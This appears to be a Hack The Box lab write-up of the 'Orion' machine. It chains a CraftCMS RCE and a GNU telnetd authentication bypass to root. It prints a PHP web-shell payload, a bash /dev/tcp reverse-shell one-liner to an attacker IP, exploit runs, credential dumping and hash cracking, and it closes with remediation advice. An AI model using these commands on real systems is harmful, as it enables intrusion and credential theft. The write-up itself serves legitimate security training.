@@ -1,0 +1,354 @@
+export const frontmatter = {
+  title: "Hack The Box Orion Machine Writeup",
+  slug: "hack-the-box-orion-machine-writeup",
+  category: "HTB Machine",
+  description:
+    "Complete walkthrough of the Hack The Box Orion machine, covering CraftCMS CVE-2025-32432 remote code execution, credential extraction from CraftCMS environment variables, password cracking for SSH access, and root privilege escalation via GNU inetutils-telnetd authentication bypass (CVE-2026-24061).",
+  date: "2026-06-26",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box Orion Writeup | CraftCMS RCE to Root via Telnet Authentication Bypass | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Orion writeup demonstrating exploitation of CraftCMS CVE-2025-32432 for remote code execution, extraction of database credentials, cracking bcrypt password hashes for SSH access, and privilege escalation using GNU inetutils-telnetd CVE-2026-24061.",
+};
+
+## Introduction
+
+Orion is a Linux-based target that highlights the severe risks associated with outdated web applications, poor password hygiene, and insecure internal services. The machine demonstrates how a single vulnerability in a public-facing application can act as a gateway to complete system compromise when defense-in-depth principles are not applied. The exploitation path walks through exploiting a recent vulnerability in CraftCMS for initial access, extracting and cracking database credentials for lateral movement, and finally abusing an unpatched local Telnet daemon to achieve root privileges.
+
+## Overview
+
+- **Target OS:** Ubuntu Linux
+- **Initial Access:** The web server runs CraftCMS version 5.6.16, which is vulnerable to CVE-2025-32432. This flaw allows for insecure deserialization and missing authorization checks, leading to unauthenticated Remote Code Execution (RCE) as the `www-data` user.
+- **Lateral Movement:** The CraftCMS environment variables contain hardcoded MySQL credentials. Connecting to the local database allows for the extraction of a bcrypt password hash for the user `adam`. Once cracked offline, these credentials grant SSH access to the machine.
+- **Privilege Escalation:** Enumeration of local listening ports reveals a GNU inetutils Telnet daemon (version 2.7) bound to localhost. This version is vulnerable to CVE-2026-24061, an authentication bypass vulnerability that instantly grants a root shell when a crafted environment variable is passed during connection.
+
+## Attack Chain
+
+1. **Reconnaissance:** Port scanning and directory enumeration reveal an SSH service and an HTTP server hosting CraftCMS.
+2. **Initial Compromise:** Exploitation of CVE-2025-32432 in the CraftCMS transformation feature grants arbitrary command execution.
+3. **Foothold:** Execution of a Base64-encoded reverse shell payload establishes an interactive session as `www-data`.
+4. **Credential Harvesting:** Inspection of environment variables reveals root database credentials.
+5. **Database Dumping:** Querying the `users` table yields the administrator's password hash.
+6. **Password Cracking:** Offline cracking of the bcrypt hash reveals the plaintext password, enabling lateral movement to the user `adam` via SSH.
+7. **Internal Discovery:** Identifying a vulnerable local-only Telnet service (GNU inetutils-telnetd 2.7) running on port 23.
+8. **Privilege Escalation:** Exploitation of the Telnet authentication bypass (CVE-2026-24061) results in a root shell.
+
+## Setup
+
+First, download the VPN configuration file from the platform and establish a connection using OpenVPN:
+```bash
+sudo openvpn machines_au-2.ovpn
+```
+
+To confirm that the target machine is reachable across the VPN, we can send a few ICMP echo requests:
+```bash
+$ ping -c 4 10.129.102.73
+
+PING 10.129.110.144 (10.129.110.144) 56(84) bytes of data.
+64 bytes from 10.129.110.144: icmp_seq=1 ttl=63 time=334 ms
+64 bytes from 10.129.110.144: icmp_seq=2 ttl=63 time=304 ms
+64 bytes from 10.129.110.144: icmp_seq=3 ttl=63 time=512 ms
+64 bytes from 10.129.110.144: icmp_seq=4 ttl=63 time=331 ms
+
+--- 10.129.110.144 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3000ms
+rtt min/avg/max/mdev = 303.804/370.104/511.707/82.598 ms
+```
+
+Navigating to the target IP address (`10.129.102.73`) in a web browser triggers an automatic redirect to `http://orion.htb`. However, the connection fails, and the page does not load.
+
+> **Note:** Because `orion.htb` is a private, unregistered domain, public DNS servers cannot resolve it. We must manually map the target IP to this hostname locally so our system knows where to route the request.
+
+We can resolve this by appending the IP and domain to our local `/etc/hosts` file:
+```bash
+echo '10.129.102.73    orion.htb' | sudo tee -a /etc/hosts
+```
+
+Once this entry is added, refreshing the browser allows the domain to resolve properly, granting us access to the web application.
+
+## Enumeration
+
+We begin our enumeration with a port scan using Nmap to identify open ports and the services running on the target machine:
+```bash
+$ nmap -sV 10.129.110.144
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-26 13:55 IST
+Nmap scan report for 10.129.110.144
+Host is up (0.31s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.09 seconds
+```
+
+Based on the Nmap results, the target is running Ubuntu Linux and has two accessible ports:
+- **Port 22 (SSH):** OpenSSH Server
+- **Port 80 (HTTP):** HTTP Server
+
+After attempting subdomain enumeration and finding no valid results, I switched to directory brute-forcing. This approach revealed several accessible directories and files, providing valuable information that helped advance the exploitation process.
+```
+$ gobuster dir -u http://orion.htb -w raft-medium-directories.txt
+
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://orion.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                raft-medium-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+admin                (Status: 302) [Size: 0] [--> http://orion.htb/admin/login]
+wp-admin             (Status: 418) [Size: 54217]
+logout               (Status: 302) [Size: 0] [--> http://orion.htb/]
+assets               (Status: 301) [Size: 178] [--> http://orion.htb/assets/]
+index                (Status: 200) [Size: 12272]
+p1                   (Status: 200) [Size: 12272]
+p15                  (Status: 200) [Size: 12272]
+p13                  (Status: 200) [Size: 12272]
+p2                   (Status: 200) [Size: 12272]
+p10                  (Status: 200) [Size: 12272]
+p3                   (Status: 200) [Size: 12272]
+p5                   (Status: 200) [Size: 12272]
+p7                   (Status: 200) [Size: 12272]
+p0                   (Status: 200) [Size: 12272]
+p24                  (Status: 200) [Size: 12272]
+p6                   (Status: 200) [Size: 12272]
+p111                 (Status: 200) [Size: 12272]
+p43                  (Status: 200) [Size: 12272]
+p76                  (Status: 200) [Size: 12272]
+p124                 (Status: 200) [Size: 12272]
+p167                 (Status: 200) [Size: 12272]
+Progress: 29999 / 29999 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+The homepage only revealed that the application was powered by **CraftCMS**, without disclosing the exact version. However, navigating to the **Orion Telecom Administration** login page (`/admin/login`) exposed the precise version, confirming that the target was running **CraftCMS 5.6.16**.
+
+This particular version is vulnerable to [**CVE-2025-32432**](https://nvd.nist.gov/vuln/detail/CVE-2025-32432). The vulnerability arises from missing authorization checks and insecure deserialization within a built-in image transformation feature. This feature allows website administrators to adjust images to a chosen format by creating a transformation template for a selected image. A detailed technical analysis and Proof of Concept (PoC) can be found in the [SensePost blog post](https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/).
+
+To verify the vulnerability, the Proof of Concept (PoC) script was saved as `poc.py` and executed against the target domain with the `id` command:
+```
+$ python3.11 poc.py http://orion.htb id
+[*] CraftCMS CVE-2025-32432 PoC
+[+] Making initial request to push payload and get a CSRF token..
+[+] Pushing the following code: <?=exec($_GET["cmd"]);die()?>
+[+] Got response 200
+[+] PHP code pushed in the session with ID: o43pp2195msac873h50391l71o
+[+] Found CSRF TOKEN: 5CLyVbCrS1Lq6jfqcjq9uAoqXJ3iLHNKNaaEE-bnZ8N0LxMEJFPk-551rQDi6jkkrINPnjFryu1SUjTb0HQDPXzWynu5tAmyG0VyNktr0JE=
+[+] Triggering code via assets/generate-transform
+[+] Got response 200
+[+] Command output:
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+The successful return of the `www-data` user context confirms that arbitrary Remote Code Execution (RCE) is possible.
+
+## Foothold
+
+To facilitate interactive post-exploitation, a reverse shell is preferable to executing individual commands through the PoC script. This can be achieved by writing a reverse shell script, encoding it to prevent syntax truncation, decoding it on the target system, and executing it via `bash`.
+
+Save the following payload locally as `rev.sh`:
+```
+bash    -c    ' 0<&158-;exec 158<>/dev/tcp/10.10.14.29/9001;sh <&158 >&158 2>&158  '
+```
+
+Open a netcat listener on the attack machine to catch the incoming connection:
+```
+$ nc -lvnp 9001
+```
+
+Encode the script using Base64 to ensure seamless transfer, then use the PoC to upload, decode, and execute it on the target host:
+```
+$ cat rev.sh | base64 -w 0 | wl-copy
+$ python3.11 poc.py http://orion.htb 'echo "...[COPIED_CONTENT]..." > rev.sh'
+$ python3.11 poc.py http://orion.htb 'cat rev.sh | base64 -d > shell.sh'
+$ python3.11 poc.py http://orion.htb 'bash shell.sh'
+```
+
+Upon execution, the netcat listener should catch the incoming connection:
+```
+Ncat: Connection from 10.129.110.144:60172.
+```
+
+To upgrade the basic shell to a fully interactive TTY, execute the following stabilization steps:
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+> **Note:** `wl-copy` is part of the `wl-clipboard` package. If it is not already installed, it can be installed with `sudo apt install wl-clipboard`. It is used to copy output directly to the clipboard for easy transfer to the target.
+
+## Lateral Movement
+
+Having stabilized the interactive shell, the environment variables can be inspected to look for database configuration details.
+
+Running the `env` command reveals critical database credentials within the CraftCMS configuration:
+```
+...[SNIP]...
+CRAFT_DB_PORT=3306
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_USER=root
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
+...[SNIP]...
+```
+
+Connect to the local MySQL instance using the harvested root credentials:
+```
+mysql -h 127.0.0.1 -P 3306 -u root -p
+```
+*When prompted, enter the password:* `SuperSecureCraft123Pass!`
+
+List the available databases and switch to the application database (`orion`):
+```
+MariaDB [(none)]> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| orion              |
++--------------------+
+
+MariaDB [(none)]> USE orion;
+```
+
+Review the available tables to locate the user directory:
+```
+MariaDB [orion]> SHOW TABLES;
++----------------------------+
+| Tables_in_orion            |
++----------------------------+
+| users                      |
++----------------------------+
+```
+
+Query the `users` table to extract administrative credentials:
+```
+MariaDB [orion]> SELECT * FROM users;
++----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
+| id | photoId | affiliatedSiteId | active | pending | locked | suspended | admin | username | fullName | firstName | lastName | email          | password                                                     | lastLoginDate       | lastLoginAttemptIp | invalidLoginWindowStart | invalidLoginCount | lastInvalidLoginDate | lockoutDate | hasDashboard | verificationCode | verificationCodeIssuedDate | unverifiedEmail | passwordResetRequired | lastPasswordChangeDate | dateCreated         | dateUpdated         |
++----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
+|  1 |    NULL |             NULL |      1 |       0 |      0 |         0 |     1 | admin    | NULL     | NULL      | NULL     | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS | 2026-03-12 11:25:04 | NULL               | 2026-06-26 08:51:07     |                 1 | 2026-06-26 08:51:07  | NULL        |            1 | NULL             | NULL                       | NULL            |                     0 | 2026-03-12 11:24:51    | 2026-03-06 11:24:45 | 2026-06-26 08:51:07 |
++----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
+```
+
+Save the extracted bcrypt hash to a local file on the attack machine and crack it using `hashcat` with mode `3200`:
+```
+$ echo -n '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
+$ hashcat -m 3200 hash.txt rockyou.txt
+```
+
+Append the `--show` flag to display the recovered plaintext password:
+```
+$ hashcat -m 3200 hash.txt rockyou.txt --show
+$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
+```
+
+The cracked plaintext password (`darkangel`) can be used to establish an interactive SSH session as the user `adam`.
+```
+sshpass -p 'darkangel' ssh adam@orion.htb
+```
+
+> **NOTE:** While `sshpass` is helpful in CTF writeups for cleanly demonstrating automated login flows, it exposes passwords in plaintext. It should never be used with real production credentials.
+
+## Privilege Escalation
+
+To enumerate services listening on the system, I used the `ss -tulnp` command, which displays listening TCP/UDP sockets along with their associated processes (when permissions allow).
+```text
+adam@orion:/~$ ss -tulnp
+Netid       State        Recv-Q       Send-Q             Local Address:Port               Peer Address:Port       Process
+udp         UNCONN       0            0                  127.0.0.53%lo:53                      0.0.0.0:*
+udp         UNCONN       0            0                        0.0.0.0:68                      0.0.0.0:*
+tcp         LISTEN       0            511                      0.0.0.0:80                      0.0.0.0:*
+tcp         LISTEN       0            128                      0.0.0.0:22                      0.0.0.0:*
+tcp         LISTEN       0            80                     127.0.0.1:3306                    0.0.0.0:*
+tcp         LISTEN       0            4096               127.0.0.53%lo:53                      0.0.0.0:*
+tcp         LISTEN       0            10                     127.0.0.1:23                      0.0.0.0:*
+tcp         LISTEN       0            128                         [::]:22                         [::]:*
+```
+
+The output revealed several listening services. In addition to the expected HTTP (80) and SSH (22) services, two services were bound only to the loopback interface: **MySQL** on port **3306** and **Telnet** on port **23**. Since these services were not exposed externally, they became interesting targets for local enumeration and potential privilege escalation.
+
+Since a Telnet service was listening locally on port **23**, I checked the installed Telnet daemon version:
+
+```text
+adam@orion:~$ telnetd --version
+
+telnetd (GNU inetutils) 2.7
+Copyright (C) 2025 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+Written by many authors.
+```
+
+Researching the identified version revealed that **GNU Inetutils Telnetd 2.7** is vulnerable to **CVE-2026-24061**, a critical authentication bypass vulnerability affecting versions **1.9.3 through 2.7**. The flaw allows an unauthenticated attacker to bypass the login process by supplying a crafted `USER` environment variable (e.g., `-f root`), resulting in remote root access. Since the target was running the vulnerable version, this presented a viable path for privilege escalation. [CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)
+
+I cloned the public proof-of-concept repository and encoded the exploit script into Base64 to make it easy to transfer to the target over my existing SSH session:
+```
+$ git clone https://github.com/SystemVll/CVE-2026-24061
+$ cd CVE-2026-24061
+$ cat main.py | base64 -w 0 | wl-copy
+```
+
+On the target, I recreated the script from the copied Base64 data and immediately executed it against the local Telnet service:
+```
+adam@orion:~$ cd /tmp/
+adam@orion:~$ echo '...[COPIED_BASE64]...' > script.b64
+adam@orion:~$ cat script.b64 | base64 -d > main.py
+adam@orion:~$ python3 main.py -u 127.0.0.1
+                                                                                                                                
+    ┌───────────────────────────────────────────────────────────────┐                                                           
+    │     CVE-2026-24061 - GNU inetutils-telnetd Auth Bypass        │                                                           
+    │                                                               │                                                           
+    │  CVSS Score: 9.8 (Critical)                                   │                                                           
+    │  Impact: Remote Authentication Bypass - Instant Root Shell    │                                                           
+    │                                                               │                                                           
+    │          This tool is part of the HGrab Framework.            │                                                           
+    └───────────────────────────────────────────────────────────────┘                                                           
+                                                                                                                                
+[2026-06-26 11:36:35] [INFO] Target: 127.0.0.1:23, User: root     
+
+...[]...
+
+root@orion:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Remediation & Recommendations
+
+To secure this environment against the attack chain demonstrated above, the following remediations should be implemented:
+
+- **Patch Public-Facing Applications:** The CraftCMS installation must be updated to the latest stable version to patch CVE-2025-32432. Regularly monitor for security advisories related to third-party CMS platforms and their plugins.
+- **Enforce Strong Password Policies:** The user `adam` utilized a weak, easily crackable password (`darkangel`) that was successfully recovered using a standard dictionary attack. Implement policies that require complex, lengthy passwords or passphrases, and audit existing passwords against known breach databases.
+- **Eliminate Password Reuse:** The password used for the CMS web application administrator account was identical to the SSH password for the system user `adam`. Users must be trained to never reuse credentials across different services and privilege domains.
+- **Disable Legacy and Unnecessary Services:** Telnet is an inherently insecure protocol that transmits data in plaintext and should not be used, even locally. The GNU inetutils-telnetd service should be completely removed from the system. If local administration is required, rely on SSH or direct socket connections.
+- **Vulnerability Management for Internal Services:** The local Telnet service was vulnerable to a critical authentication bypass (CVE-2026-24061). Internal services bound to loopback interfaces are often overlooked during patching cycles. Ensure that all installed software is kept up to date, regardless of whether it is exposed to the external network.
+
+## MITRE ATT&CK Mapping
+
+- **Reconnaissance** - Active Scanning (T1595)
+- **Initial Access** - Exploit Public-Facing Application (T1190)
+- **Execution** - Command and Scripting Interpreter: Unix Shell (T1059.004)
+- **Credential Access** - Credentials from Password Stores (T1555) and Password Cracking (T1110.002)
+- **Lateral Movement** - Remote Services: SSH (T1021.004)
+- **Privilege Escalation** - Exploitation for Privilege Escalation (T1068)
+
